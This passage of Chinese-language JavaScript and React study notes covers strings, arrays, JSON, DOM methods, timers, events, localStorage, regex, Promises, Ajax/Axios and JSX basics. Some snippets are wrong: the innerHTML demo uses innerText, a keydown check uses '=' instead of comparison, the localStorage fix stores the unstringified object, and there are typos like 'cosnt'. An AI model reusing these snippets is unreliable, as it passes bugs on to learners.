```javascript
for (let char of "Hello") {
  alert(char); // H,e,l,l,o（char 变为 "H"，然后是 "e"，然后是 "l" 等）
}
```

##### 字符串不可变

在 JavaScript 中，字符串不可更改。改变字符是不可能的。

我们证明一下为什么不可能：

```javascript
let str = 'Hi';

str[0] = 'h'; // error
alert( str[0] ); // 无法运行

//但是这样可以
str = 'hi';
//字符串的改变不能单独改变单个字符要改就要全部赋值，如下
let str = 'Hi';

str = 'h' + str[1];  // 替换字符串

alert( str ); // hi
```

##### 改变大小写

toLowerCase()和 toUpperCase()方法可以改变大小写：

```javascript
alert( 'Interface'.toUpperCase() ); // INTERFACE
alert( 'Interface'.toLowerCase() ); // interface
```

或者我们想要使一个字符变成小写：

```javascript
alert( 'Interface'[0].toLowerCase() ); // 'i'
```

##### 查找子字符串

第一个方法是 str.indexOf(substr, pos)

它从给定位置 `pos` 开始，在 `str` 中查找 `substr`，如果没有找到，则返回 `-1`，否则返回匹配成功的位置。

例如：

```javascript
let str = 'Widget with id';

alert( str.indexOf('Widget') ); // 0，因为 'Widget' 一开始就被找到
alert( str.indexOf('widget') ); // -1，没有找到，检索是大小写敏感的

alert( str.indexOf("id") ); // 1，"id" 在位置 1 处（……idget 和 id）
```

可选的第二个参数允许我们从一个给定的位置开始检索。

例如，`"id"` 第一次出现的位置是 `1`。查询下一个存在位置时，我们从 `2` 开始检索：

```javascript
let str = 'Widget with id';

alert( str.indexOf('id', 2) ) // 12
```

第二个方法是includes，startsWith，endsWith

更现代的方法 str.includes(substr, pos) 根据 `str` 中是否包含 `substr` 来返回 `true/false`。

如果我们需要检测匹配，但不需要它的位置，那么这是正确的选择：

```javascript
alert( "Widget with id".includes("Widget") ); // true

alert( "Hello".includes("Bye") ); // false
```

`str.includes` 的第二个可选参数是开始搜索的起始位置：

```javascript
alert( "Widget".includes("id") ); // true
alert( "Widget".includes("id", 3) ); // false, 从位置 3 开始没有 "id"
```

方法 str.startsWith 和 str.endsWith的功能与其名称所表示的意思相同：

```javascript
alert( "Widget".startsWith("Wid") ); // true，"Widget" 以 "Wid" 开始
alert( "Widget".endsWith("get") ); // true，"Widget" 以 "get" 结束
```

##### 获取子字符串

JavaScript 中有三种获取字符串的方法：`substring`、`substr` 和 `slice`。

`str.slice(start [, end])`

返回字符串从 `start` 到（但不包括）`end` 的部分。

```javascript
let str = "stringify";
alert( str.slice(0, 5) ); // 'strin'，从 0 到 5 的子字符串（不包括 5）
alert( str.slice(0, 1) ); // 's'，从 0 到 1，但不包括 1，所以只有在 0 处的字符
```

`start/end` 也有可能是负值。它们的意思是起始位置从字符串结尾计算：

```javascript
let str = "stringify";

// 从右边的第四个位置开始，在右边的第一个位置结束
alert( str.slice(-4, -1) ); // 'gif'
```

`str.substring(start [, end])`

返回字符串从 `start` 到（但不包括）`end` 的部分。

这与 `slice` 几乎相同，但它允许 `start` 大于 `end`。不支持负参数（不像 slice），它们被视为 `0`。

`str.substr(start [, length])`

返回字符串从 `start` 开始的给定 `length` 的部分。

与以前的方法相比，这个允许我们指定 `length` 而不是结束位置：

```javascript
let str = "stringify";
alert( str.substr(2, 4) ); // 'ring'，从位置 2 开始，获取 4 个字符
```

第一个参数可能是负数，从结尾算起：

```javascript
let str = "stringify";
alert( str.substr(-4, 2) ); // 'gi'，从第 4 位获取 2 个字符
```

##### 字符串的比较

调用 str.localeCompare(str2) 会根据语言规则返回一个整数，这个整数能指示字符串 `str` 在排序顺序中排在字符串 `str2` 前面、后面、还是相同：

- 如果 `str` 排在 `str2` 前面，则返回负数。
- 如果 `str` 排在 `str2` 后面，则返回正数。
- 如果它们在相同位置，则返回 `0`。

```javascript
alert( 'Österreich'.localeCompare('Zealand') ); // -1
```

#### 10.3 数组方法

##### at方法获取元素

`arr.at(i)`：

- 如果 `i >= 0`，则与 `arr[i]` 完全相同。
- 对于 `i` 为负数的情况，它则从数组的尾部向前数。

```javascript
let fruits = ["Apple", "Orange", "Plum"];

// 与 fruits[fruits.length-1] 相同
alert( fruits.at(-1) ); // Plum
```

##### pop/push, shift/unshift 方法

pop/push作用于末端

`pop`取出并返回数组的最后一个元素：

```javascript
let fruits = ["Apple", "Orange", "Pear"];

alert( fruits.pop() ); // 移除 "Pear" 然后 alert 显示出来

alert( fruits ); // Apple, Orange
```

`fruits.pop()` 和 `fruits.at(-1)` 都返回数组的最后一个元素，但 `fruits.pop()` 同时也删除了数组的最后一个元素，进而修改了原数组。



`push`在数组末端添加元素：

```javascript
let fruits = ["Apple", "Orange"];

fruits.push("Pear");

alert( fruits ); // Apple, Orange, Pear
```



shift/unshift作用于首端

`shift`取出数组的第一个元素并返回它：

```javascript
let fruits = ["Apple", "Orange", "Pear"];

alert( fruits.shift() ); // 移除 Apple 然后 alert 显示出来

alert( fruits ); // Orange, Pear
```

`unshift`在数组的首端添加元素：

```javascript
let fruits = ["Orange", "Pear"];

fruits.unshift('Apple');

alert( fruits ); // Apple, Orange, Pear
```



`push` 和 `unshift` 方法都可以一次添加多个元素：

```javascript
let fruits = ["Apple"];

fruits.push("Orange", "Peach");
fruits.unshift("Pineapple", "Lemon");

// ["Pineapple", "Lemon", "Apple", "Orange", "Peach"]
alert( fruits );
```

##### 历遍数组

foreach循环方法允许为数组的每个元素都运行一个函数。

```javascript
// 对每个元素调用 alert
["Bilbo", "Gandalf", "Nazgul"].forEach(alert);
```

而这段代码更详细地介绍了它们在目标数组中的位置：

```javascript
["Bilbo", "Gandalf", "Nazgul"].forEach((item, index, array) => {
  alert(`${item} is at index ${index} in ${array}`);
});
```

##### 移除指定元素

arr.splice 方法可以说是处理数组的瑞士军刀。它可以做所有事情：添加，删除和插入元素。

```javascript
arr.splice(start[, deleteCount, elem1, ..., elemN])
```

它从索引 `start` 开始修改 `arr`：删除 `deleteCount` 个元素并在当前位置插入 `elem1, ..., elemN`。最后返回被删除的元素所组成的数组。

```javascript
let arr = ["I", "study", "JavaScript"];

arr.splice(1, 1); // 从索引 1 开始删除 1 个元素

alert( arr ); // ["I", "JavaScript"]
```

#### 10.4 复杂数据类型(对象)与字符串的相互转换

==因为在网络传输或储存都传输的是字符串==，所以我们需要把对象或其他复杂数据转==换成字符串的形式==，进行操作。

把对象转换成字符串就要用到`JSON`方法，`JSON`（JavaScript Object Notation）是表示值和对象的通用格式。

`JSON`有两种方法

- `JSON.stringify` 将对象转换为 JSON。==语法：JSON.stringify(value[, replacer, space])==
- `JSON.parse` 将 JSON 转换回对象。

```javascript
let student = {
  name: 'John',
  age: 30,
  isAdmin: false,
  courses: ['html', 'css', 'js'],
  spouse: null
};

let json = JSON.stringify(student);

alert(typeof json); // we've got a string!

alert(json);
/* JSON 编码的对象：
{
  "name": "John",
  "age": 30,
  "isAdmin": false,
  "courses": ["html", "css", "js"],
  "spouse": null
}
*/
```

方法 `JSON.stringify(student)` 接收对象并将其转换为字符串。

得到的 `json` 字符串是一个被称为 **JSON 编码（JSON-encoded）** 或 **序列化（serialized）** 或 **字符串化（stringified）** 或 **编组化（marshalled）** 的对象。我们现在已经准备好通过有线发送它或将其放入普通数据存储。

请注意，JSON 编码的对象与对象字面量有几个重要的区别：

- 字符串使用双引号。JSON 中没有单引号或反引号。所以 `'John'` 被转换为 `"John"`。
- 对象属性名称也是双引号的。这是强制性的。所以 `age:30` 被转换成 `"age":30`。

### 11、DOM

#### 11.1 DOM树

==文档对象模型（Document Object Model），简称 DOM，将所有页面内容表示为可以修改的对象。==

`document` 对象是页面的主要“入口点”。我们可以使用它来更改或创建页面上的任何内容。

根据文档对象模型（DOM），每个 HTML 标签都是一个对象。嵌套的标签是闭合标签的“子标签（children）”。标签内的文本也是一个对象。

所有这些对象都可以通过 JavaScript 来访问，我们可以使用它们来修改页面。

例如，`document.body` 是表示 `<body>` 标签的对象。

运行这段代码会使 `<body>` 保持 3 秒红色状态:

```javascript
document.body.style.background = 'red'; // 将背景设置为红色

setTimeout(() => document.body.style.background = '', 3000); // 恢复回去
```



在一个html文件中

```html
<!DOCTYPE HTML>
<html>
<head>
  <title>About elk</title>
</head>
<body>
  The truth about elk.
</body>
</html>
```

DOM 将 HTML 表示为标签的树形结构。它看起来如下所示：

![image-20230707151844018](./img/小米虫爬山路-img/image-20230707151844018.png)



#### 11.2 获取DOM元素



#### 11.3 通过选择器来获取DOM元素

##### querySelectorAll(css)

到目前为止，最通用的方法是 `document.querySelectorAll(css)`，它返回 `document` 中与给定 CSS 选择器匹配的所有元素。

```javascript
<ul>
  <li>The</li>
  <li>test</li>
</ul>
<ul>
  <li>has</li>
  <li>passed</li>
</ul>
<script>
  let elements = document.querySelectorAll('ul > li:last-child');

  for (let elem of elements) {
    alert(elem.innerHTML); // "test", "passed"
  }
</script>
```

==返回的是一个数组，数组里面元素是DOM对象==

##### querySelector(css)

`document.querySelector(css)` 调用会返回给定 CSS 选择器的第一个元素。换句话说，结果与 `document.querySelectorAll(css)[0]` 相同，但是后者会查找 **==所有==** 元素，并从中选取一个，而 `document.querySelector(css)` 只会查找一个。因此它在速度上更快，并且写起来更短。

#### 11.4 修改元素内容

##### 元素innerText属性

向对象里面添加纯文本==不解析标签==，将文本内容添加/更新到任意标签位置。

```javascript
    <div class="class">我是文字</div>

    <script>
        let div = document.querySelector('.class');
        div.innerText = '我不是文字'
    </script>
```

==注意：这里的文本是不解析标签的==

```javascript
<div class="class">我是文字</div>

    <script>
        let div = document.querySelector('.class');
        div.innerText = '<button>我不是文字</button>';
    </script>
```

##### 元素innerHTML属性

将文本内容添加/更新到任意标签位置会解析标签，多标签建议使用模板字符。

与`innerText`属性最大的区别就是==会解析标签==

```javascript
<div class="class">我是文字</div>

    <script>
        let div = document.querySelector('.class');
        div.innerText = '<button>我不是文字</button>';
    </script>
//在div中就会有一个按钮
```

#### 11.5 修改元素常见属性

元素常见属性如scr、href、name等，都可以通过得到对象，再通过==对象.属性 = 值；==

#### 11.6 修改元素样式属性

##### 通过style属性修改样式

==语法：对象.style.属性值=值;==

##### 通过标签的类名修改样式

如果修改的样式比较多，直接通过style属性修改比较繁琐，我们可以通过借助于css类名的形式。

操作类名(className)修改CSS,==语法：元素.className = 'active';== //active是css的一个类名

##### .通过classList 操作类控制CSS

为了解决className容易覆盖以前的类名，我们可以通过classList方式**追加**和删除类名。

语法：

//追加一个类
	==元素.classList.add('类名')==

//删除一个类
	==元素.classList.remove('类名')==

//切换一个类，有就加上，没有就观点
	==元素.classList.toggle('类名')==

#### 11.7 修改表单属性

表单很多情况，也需要修改属性，比如点击眼睛，可以看到密码，本质是把表单类型转换为文本框

正常的有属性有取值的跟其他的标签属性没有任何区别

##### 得到表单的值

语法：元素.value

##### 修改表单类型

语法：元素.type = 值

### 12、定时器

定时器有两种：

- `setTimeout` 允许我们将函数推迟到一段时间间隔之后再执行。
- `setInterval` 允许我们重复运行一个函数，从一段时间间隔之后开始运行，之后以该时间间隔连续重复运行该函数。

#### 12.1 setTimeout

```javascript
let timerId = setTimeout(function(){}, [delay], [arg1], [arg2], ...)
```

`function(){}`

要执行的函数/操作

`delay`

执行前的延时，以毫秒为单位（1000 毫秒 = 1 秒），默认值是 0；

`arg1`，`arg2`…

要传入被执行函数（或代码字符串）的参数列表（IE9 以下不支持）

```javascript
function sayHi() {
  alert('Hello');
}

setTimeout(sayHi, 1000);
//有参数的情况
function sayHi(phrase, who) {
  alert( phrase + ', ' + who );
}

setTimeout(sayHi, 1000, "Hello", "John"); // Hello, John

```

```javascript
// 错的！
setTimeout(sayHi(), 1000);
```

这样不行，因为 `setTimeout` 期望得到一个对函数的引用。而这里的 `sayHi()` 很明显是在执行函数，所以实际上传入 `setTimeout` 的是 **函数的执行结果**。在这个例子中，`sayHi()` 的执行结果是 `undefined`（也就是说函数没有返回任何结果），所以实际上什么也没有调度。

#### 12.2 clearTimeout

`setTimeout` 在调用时会返回一个“定时器标识符（timer identifier）”(定时器ID)，在我们的例子中是 `timerId`，我们可以使用它来取消执行。

==注意：每次调用一次setTimeout()就会产生新的定时器ID==

取消调度的语法：

```javascript
let timerId = setTimeout(...);
clearTimeout(timerId);
```

#### 12.3 setInterval

`setInterval` 方法和 `setTimeout` 的语法相同：

```javascript
let timerId = setInterval(func|code, [delay], [arg1], [arg2], ...)
```

和`setTimeout`一样先等待时间再执行函数

下面的例子将每间隔 2 秒就会输出一条消息。5 秒之后，输出停止：

```javascript
// 每 2 秒重复一次
let timerId = setInterval(() => alert('tick'), 2000);

// 5 秒之后停止
setTimeout(() => { clearInterval(timerId); alert('stop'); }, 5000);
```

### 13 事件监听

语法:元素对象.addEventListener('事件类型'，要执行的函数)

事件类型有：

鼠标事件 

`mousedown/mouseup`:在元素上点击/释放鼠标按钮。



`mouseover/mouseout`:鼠标指针从一个元素上移入/移出。



`mousemove`:鼠标在元素上的每个移动都会触发此事件



`click`:如果使用的是鼠标左键，则在同一个元素上的 `mousedown` 及 `mouseup` 相继触发后，触发该事件。



`dblclick`:在短时间内双击同一元素后触发。如今已经很少使用了。



`contextmenu`:在鼠标右键被按下时触发。还有其他打开上下文菜单的方式，例如使用特殊的键盘按键，在这种情况下它也会被触发，因此它并不完全是鼠标事件。



==顺序==：在单个动作触发多个事件时，事件的顺序是固定的。也就是说，会遵循 `mousedown` → `mouseup` → `click` 的顺序调用处理程序。



键盘事件

在进行键盘事件,可以通过`event.key`和`event.code`获取键值

```javascript
document.addEventListener('keydown', function(event) {
  if (event.key = "Enter") {//如果是回车键就执行if的内容
    alert('Undo!')
  }
});
```



`keydown `:当一个按键被按下时，会触发 `keydown` 事件



`keyup`:当按键被释放时，会触发 `keyup` 事件。



`keypress`: 按下某个键盘键并释放时触发,会触发 `keypress` 事件



`input`事件

每当用户对输入值进行修改后，就会触发 `input` 事件。与键盘事件不同，只要值改变了，`input` 事件就会触发，即使那些不涉及键盘行为（action）的值的更改也是如此：使用鼠标粘贴，或者使用语音识别来输入文本。

```javascript
<input type="text" id="input"> oninput: <span id="result"></span>
<script>
  input.addEventListener('input' ,function() {
    result.innerHTML = input.value;
  });
</script>
```



### 14 DOM节点操作

DOM树中的每一个内容都称之为节点，类型有==元素节点==(所有标签)、==属性节点==、==文本节点==和其他节点

#### 14.1 获取节点

通过节点关系:针对的找亲戚返回的都是对象

##### 查找父节点

==子元素.parentNode==，返回最近一级的父节点找不到返回为null



##### 查找子节点

 ==父元素.children==,仅获得所有子元素节点,返回的还是一个伪数组

##### 查找兄节点

下一个兄弟节点
==兄弟元素.nextElementSibling==属性

上一个兄弟节点
==兄弟元素.previousElementSibling==属性

#### 14.2 增加节点和克隆节点

**一般步骤：**

**1.创建节点**

**2.新节点放入指定元素内部**

##### 创建节点

即创造出一个新的网页元素，再添加到网页内，一般先创建节点，然后插入节点

==语法：document.createElement('标签名')==

##### 追加节点

要确定位置

插入到父元素的最后一个子元素:

==父元素.appendChild(子元素);==

插入到父元素中某个子元素前：

==父元素.insertBefore(要插入的元素，在哪个元素前面)== 

##### 克隆节点

==元素.cloneNode(布尔值)==

cloneNode会克隆出一个跟原标签一样的元素，括号内传入布尔值
	若为==true==，则代表克隆时会包含后代节点一起克隆，深克隆
	若为==false==，则代表克隆时不包含后代节点，浅克隆
	默认为==false==



#### 14.3 删除节点

在JavaScript原生DOM操作中，要删除元素必须通过父元素删除

==父元素.removeChild(要删除的元素)==

删除节点和隐藏节点(==display:none==）有区别的:隐藏节点还是存在的，但是删除，则从html中删除节点

### 15 本地存储

Web 存储对象 `localStorage` 和 `sessionStorage` 允许我们在浏览器上保存键/值对。它们有趣的是，在页面刷新后（对于 `sessionStorage`）甚至浏览器完全重启（对于 `localStorage`）后，数据仍然保留在浏览器中。我们很快就会看到。

两个存储对象都提供相同的方法和属性：

- `setItem(key, value)` —— 存储键/值对。
- `getItem(key)` —— 按照键获取值。
- `removeItem(key)` —— 删除键及其对应的值。
- `clear()` —— 删除所有数据。
- `key(index)` —— 获取该索引下的键名。
- `length` —— 存储的内容的长度。

#### 15.1 localStorage

**存储**

能够使用localStorage把数据存储的浏览器中。

作用:可以将数据永久存储在本地(用户的电脑),除非手动删除，否则关闭页面也会存在

==语法：localStorage.setltem('key', 'value')==

要加引号成为否则就是变量。



**存储复杂数据类型**

```javascript
 const student = {
        name : '李四',
        age : '18',
        shcool : '理工大学'
    }
    localStorage.setItem('student',student);
//这样是存入的对象，无法取出使用，要解决就要使用JSON类型
```

解决:使用`JSON.stringify`将==复杂数据类型转换成JSON字符串==,在存储到本地，在10原始数据方法里有介绍

```javascript
 const student = {
        name : '李四',
        age : '18',
        shcool : '理工大学'
    }
 let json = JSON.stringify(student);
    localStorage.setItem('student',student);
```

#### 15.2 sessionStorage

与localStorage使用相同

### 16 正则表达式

正则表达式是提供了一种在文本中进行搜索和替换的强大的方式的模式。在 JavaScript 中，我们可以通过 `RegExp`对象使用它们，也可以与字符串方法结合使用。

正则表达式（可叫作 “regexp”，或 “reg”）由 **模式** 和可选的 **修饰符** 组成。

#### 16.1==定义语法==

较长一点的语法：

```javascript
regexp = new RegExp("pattern", "flags");
```

较短一点的语法，使用斜线 `"/"`：

```javascript
regexp = /pattern/; // 没有修饰符
regexp = /pattern/gmi; // 带有修饰符 g、m 和 i（后面会讲到）
```

斜线 `/.../` 告诉 JavaScript 我们正在创建一个正则表达式。它的作用与字符串的引号作用相同。这两种语法之间的主要区别在于，使用斜线 `/.../` 的模式不允许插入表达式（如带有 `${...}` 的字符串模板）。它是完全静态的。

#### 16.2**修饰符**

正则表达式可能有影响搜索结果的修饰符。

在 JavaScript 中，只有 6 个修饰符：

- `i`：使用此修饰符后，搜索时不区分大小写：`A` 和 `a` 之间没有区别（请参见下面的示例）。
- `g`：使用此修饰符后，搜索时会寻找所有的匹配项 —— 没有它，则仅返回第一个匹配项。
- `m`：多行模式
- `s`:启用 “dotall” 模式，允许点 `.` 匹配换行符 `\n`
- `u`:开启完整的 Unicode 支持。该修饰符能够正确处理代理对
- `y`:粘滞（Sticky）模式，在文本中的确切位置搜索

#### 16.3 测试test

==语法：regexp.test(被检查字符串)==

`regexp.test(str)` 方法寻找至少一个匹配项，如果找到了，则返回 `true`，否则返回 `false`。

```javascript
let str = "I love JavaScript";
let regexp = /LOVE/i;

alert( regexp.test(str) ); // true
```

#### 16.4 元字符(特殊字符)

是一些具有特殊含义的字符，可以极大提高了灵活性和强大的匹配功能。

存在以下字符类：

- `\d` —— 数字。
- `\D` —— 非数字。
- `\s` —— 空格符号，制表符，换行符。
- `\S` —— 除了 `\s` 。
- `\w` —— 拉丁字母，数字，下划线 `'_'`。
- `\W` —— 除了 `\w`。
- `.` —— 带有修饰符 `'s'` 时匹配任何字符，否则匹配除换行符 `\n` 之外的任何字符。

##### 边界符号

插入符号 `^` 和美元符号 `$` 在正则表达式中具有特殊的含义。它们被称为“==锚点==”。

插入符号 `^` 匹配文本开头，而美元符号 `$` 则匹配文本末尾。它们并不匹配一个具体的字符，而是让正则引擎测试所表示的条件（文本开头/文本末尾）。

##### 范围字符

[]符号就是**字符范围**符号

例如，`[a-z]` 表示从 `a` 到 `z` 范围内的字符，`[0-5]` 表示从 `0` 到 `5` 的数字。

- **\d** —— 和 `[0-9]` 相同，
- **\w** —— 和 `[a-zA-Z0-9_]` 相同，
- **\s** —— 和 `[\t\n\v\f\r ]` 外加少量罕见的 Unicode 空格字符相同。
- `[0-9A-F]` 中有两个范围：它搜索一个字符，该字符要么是在 `0` 到 `9` 范围内的数字，要么是从 `A` 到 `F` 的字母。

除了普通的范围匹配，还有像这样 `[^…]` 的“排除”范围匹配。通过在开头添加插入符号 `^` 来表示匹配所有 **除了给定的字符** 之外的任意字符。

##### 量词符号

**+, *, ? 和 {n}**

假设我们有一个像这样 `+7(903)-123-45-67` 的字符串，并想要找到其中所有数字。但与之前不同的是，我们对单个数字不感兴趣，只对全数感兴趣：`7, 903, 123, 45, 67`。

| 量词  |       说明       |
| :---: | :--------------: |
|   *   | 重复零次或更多次 |
|   +   | 重复一次或更多次 |
|   ?   |  重复零次或一次  |
|  {n}  |     重复n次      |
| {n,}  | 重复n次或更多次  |
| {n,m} |    重复n到m次    |

这是一个java的正则表达式，辅助理解一下：

```java
//通过正则表达式"[1-9]\\d{0,2}(\\.\\d{0,2})?"代表[1-9]第一个数字为1-9的任意数，\\d{0,2}代表后面为0-2位的任意数字，(\\.\\d{0,2})? 表示匹配一个小数点后面跟着0到2个数字的可选部分
```

检查中文简体繁体字符的正则表达:

```java
字符串："^[\\u4e00-\\u9fa5]{0,}$"
正则表达式：^[\u4e00-\u9fa5]{0,}$
```

如我前一个数字是0那么我后一个数组就必须在0-5的范围，前一个数字是9后一个数字在6-9的范围

```java
正则表达式/^(0[0-5]|9[6-9])$/表示以0开头，后跟0-5之间的数字，或者以9开头，后跟6-9之间的数字，然后以字符串结尾
在你提到的正则表达式中，括号 (0[0-5]|9[6-9]) 是一个分组，它将两个子表达式 0[0-5] 和 9[6-9] 组合在一起，并使用逻辑或 | 表示匹配其中任意一个子表达式。这个分组表示匹配前一个数字是0，后一个数字在0-5的范围，或者前一个数字是9，后一个数字在6-9的范围。
```

### 17、高阶js

#### 17.1 回调函数

回调函数callback什么是回调函数
定义:把A函数当作==**参数**==传递到B函数内部再B函数内部以形参的方式==**调用A函数**==.这种函数的调用方式,我们叫做==**回调函数(callback)**==

```javascript
function A(){
    console.log("a")
}

function B(cd){
    console.log("b")
    cd();
}
B(A);
//上述回调函数会先打印b再打印a



//复杂一点
function A(cd){
    console.log("a")
    cd()
}

function B(cd){
    console.log("b")
    cd(()=> console.log(new date()));    
}
B(A)
//这个就会先打印b再打印a最后打印时间
```

回调地狱：不停的再一个回调函数里面去进行第二个回调函数的操作,就是代码没有可读性和可维护性

##### 为什么需要回调函数：

1. 异步
2. 因为我要在异步的末尾或者中间做一些事情

#### 17.2 Promise

**Promise** 是将“生产者代码”和“消费者代码”连接在一起的一个特殊的 JavaScript 对象。分三种状态

- 持续pending
- 成功resolved
- 失败rejected

作用：专门用**来解决回调地狱问题**

Promise的基础语法：Promise是一个构造函数

```javascript
cosnt q =  new Promise(function(resolve, reject){'executor'你想要执行的操作})
//q是一个promise的对象
q.then(function(){
//这个执行的就是resolve这个函数
}
q.catch(function(){
//这个执行的就是reject这个函数
}
```

传递给 new Promise 的函数被称为 `executor`。当 new Promise 被创建，executor 会自动运行。它包含最终应产出结果的生产者代码

它的参数 `resolve` 和 `reject` 是由 JavaScript 自身提供的回调。我们的代码仅在 executor 的内部。

当 executor 获得了结果，无论是早还是晚都没关系，它应该调用以下回调之一：

- `resolve(value)` —— 如果任务成功完成并带有结果 `value`。
- `reject(error)` —— 如果出现了 error，`error` 即为 error 对象。

所以总结一下就是：executor 会自动运行并尝试执行一项工作。尝试结束后，如果成功则调用 `resolve`，如果出现 error 则调用 `reject`。



### 18、Ajax

概念:Asynchronous JavaScript And XML，异步的JavaScript和XML（标记语言存储数据）。

作用:

- 数据交换:通过Ajax可以给服务器发送请求，并获取服务器响应的数据。
- 异步交互:可以在不重新加载整个页面的情况下，与服务器交换数据并更新部分网页的技术，如:搜索联想、用户名是否可用的校验等等。

#### 18.1 异步与同步

![image-20230808100615232](./img/小米虫爬山路-img/image-20230808100615232.png)

同步：需要等到服务端返回响应前端才会继续执行

异步：不需要等到服务端来返回响应就可以继续执行前端的操作

#### 18.2 Ajax

步骤：

1.  第一步：创建异步请求对象。
2.  第二步：打开连接。
3.  第三步：发送请求。
4.  第四步：设置监听对象改变所触发的函数,处理结果

#####  GET请求方式的入门

```java
//使用原生的js代码发送异步请求
function fn1() {
    //1. 创建XMLHTTPRequest对象
    let xhr = new XMLHttpRequest();
    //2. 建立与服务器的连接
    xhr.open("GET","demo01?username=jay")
    //3. 发送请求
    xhr.send()

    //4.自己编写代码处理响应，展示响应数据
    xhr.onreadystatechange = function () {
        if (xhr.readyState == 4 && xhr.status == 200) {
            //获取响应数据
            var responseText = xhr.responseText;
            document.getElementById("msg").innerHTML = responseText
        }
    }
}
```

##### POST请求方式的入门

```java
//使用js原生的代码发送异步的post请求
function fn2() {
    //1. 创建XMLHTTPRequest对象
     let xhr = new XMLHttpRequest();
    //2. 建立与服务器的连接
    xhr.open("POST","demo01")
    //3. 发送请求
    //设置一个请求头，用来设置请求参数的类型
    xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded")
    xhr.send("username=jay")
    //4.自己编写代码处理响应，展示响应数据
    xhr.onreadystatechange = function () {
        if (xhr.readyState == 4 && xhr.status == 200) {
            //获取响应数据
            var responseText = xhr.responseText;
            document.getElementById("msg").innerHTML = responseText
        }
    }
}
```

##### get和post的区别

- get：用于获取数据，将请求参数附加在URL的末尾，通常用于请求数据列表等操作。
- post：用于提交数据，将请求参数放在请求体中，通常用于新增、修改等操作。
- 从语义上来说，get表示“请给我这些资源”，post表示“我要提交这些资源”，因此使用时需要根据业务需求进行选择。

#### 18.3 Axios

介绍:Axios 对原生的Ajax进行了封装，简化书写，快速开发。

官网: https://www.axios-http.cn/

第一步：引入Axios的js文件

```html
<script src="js/axios-18.0.js"></script>
```

第二步：使用Axios发生请求，并获取响应结果

```js
//在Axios中提供有有发送请求和提交数据的api直接使用就行了
//首先引入axios
<script src="js/axios.js"></script>
<script>
  function get () {
    //获取数据并在控制台打印数据
    axios.get("https://unpkg.com/axios/dist/axios.min.js").then(result => {
      console.log(result.data)
    })
  }
</script>
```

Axios的所有请求方式：

```js
//传入url和请求参数
axios.get(url [, config])//从服务器获取数据 (参数是 params:{键值对})
axios.delete(url [, config])//  删除服务器上的数据
axios.post(url [, data[, config]])//向服务器新增数据 (参数是 data:{键值对})
axios.put(url [, data[, config]l)//完整更新服务器上的数据(一般可用于更新用户的完整信息)
axios.patch(url,[,data[,config]])//部分更新服务器上的数据(例如:只更新用户的手机号)
```

**注意：**
**post请求的时候参数通过data进行传递**
**get请求的时候参数通过params进行传递**

## 三、React

### 1、React介绍

一个专注于构建用户界面的JavaScript库，和vue和angular并称前端三大框架，不夸张的说，react引领了很多新思想，世界范围内是最流行的js前端框架，最近发布了18版本，加入了很多新特性。

[React英文文档]( https://reactjs.org/ )
	[React中文文档](https://zh-hans.reactjs.org/)
	[React新文档]( https://beta.reactjs.org/)(开发中....)

特点：

1.声明式UI(JSX)
	写UI就和写普通的HTML一样，抛弃命令式的繁琐实现

2．组件化
	组件是react中最重要的内容，组件可以通过搭积木的方式拼成一个完整的页面，通过组件的抽象可以增加复用能力和提高可维护性

3.—次学习，矿平台编写
	react既可以开发web应用也可以使用同样的语法开发原生应用(react-native)，比如安卓和ios应用，甚至可以使用react开发VR应用，想象力空	间十足，react更像是一个元框架为各种领域赋能

### 2、环境初始化

要初始化环境首先要安装node.js并配置好。 安装好后就可以进入项目创建。

-  打开命令行窗口 

-  执行命令 

  ```bash
  npx create-react-app react-basic
  ```

  说明： 

  1. npx create-react-app 是固定命令，`create-react-app`是React脚手架的名称

  2. react-basic表示项目名称，可以自定义，保持语义化

  3. npx 命令会帮助我们临时安装create-react-app包，然后初始化项目完成之后会自自动删掉，所以不需要全局安装create-react-app

然后使用vs来打开创建好的文件react-basic，如果你是全局安装了create-react-app的话就可以在vs里使用`yarn start`,但是没安装的话就是用`npm start`来打开项目

### 3、项目目录说明调整

- 目录说明 

1. 1. `src` 目录是我们写代码进行项目开发的目录
   2. `package.json`  中俩个核心库：react 、react-dom

-  目录调整 

1. 1. 删除src目录下自带的所有文件，只保留app.js根组件和index.js
   2. 创建index.js文件作为项目的入口文件，在这个文件中书写react代码即可

-  入口文件说明 

```jsx
//React:框架的核心包
//ReactDOM:专门做渲染相关的包

import React from 'react'
import ReactDOM from 'react-dom'
//全局样式文件
import './index.css'
// 引入根组件App
import App from './App'
// 通过调用ReactDOM的render方法渲染App根组件到id为root的dom节点上
ReactDOM.render(
  <React.StrictMode>
    <App />
  </React.StrictMode>,
  document.getElementById('root')
)
```

注意：接下来在APP.js下学习就行了

### 4、JSX基础

==JSX干了什么==

![img](./img/小米虫爬山路-img/77aff59ba0bf06683c806a3cd2bd91b9.png)

#### 4.1 `jsx`介绍

概念：JSX是 JavaScript XML（HTML）的缩写，==表示在 JS 代码中书写 HTML 结构==

作用：==在React中创建HTML结构（页面UI结构）==

优势：

1. 采用类似于HTML的语法，降低学习成本，会HTML就会JSX
2. 充分利用JS自身的可编程能力创建HTML结构

注意：JSX 并不是标准的 JS 语法，是 JS 的语法扩展，浏览器默认是不识别的，脚手架中内置的 [@babel/plugin-transform-react-jsx](@babel/plugin-transform-react-jsx) 包,用来解析该语法

![image-20230713101050699](./img/小米虫爬山路-img/image-20230713101050699.png)

注意：写左边的声明式，但babel会帮我们自动编译。

#### 4.2 `jsx`中使用`js`表达式

**语法**

=={ JS 表达式 }==

```jsx
const name = '柴柴'

<h1>你好，我叫{name}</h1> //    <h1>你好,我叫柴柴</h1>
```

**可以使用的表达式**

1. 字符串、数值、布尔值、null、undefined、object（ [] / {} ）
2. 1 + 2、'abc'.split('')、['a', 'b'].join('-')
3. fn()

**特别注意**

if 语句/ switch-case 语句/ 变量声明语句，这些叫做语句，不是表达式，不能出现在 `{}` 中！！

#### 4.3 JSX列表渲染

能够在JSX中实现列表渲染

```jsx
// 来个列表
const songs = [
  { id: 1, name: '痴心绝对' },
  { id: 2, name: '像我这样的人' },
  { id: 3, name: '南山南' }
]

function App() {
  return (
    <div className="App">
      <ul>
        {
          songs.map(item => <li>{item.name}</li>)
        }
      </ul>
    </div>
  )
}

export default App
```



==注意点：需要为遍历项添加 `key` 属性==

1. key 在 HTML 结构中是看不到的，是 React 内部用来进行性能优化时使用
2. key 在当前列表中要唯一的字符串或者数值（String/Number）
3. 如果列表中有像 id 这种的唯一值，就用 id 来作为 key 值
4. 如果列表中没有像 id 这种的唯一值，就可以使用 index（下标）来作为 key 值

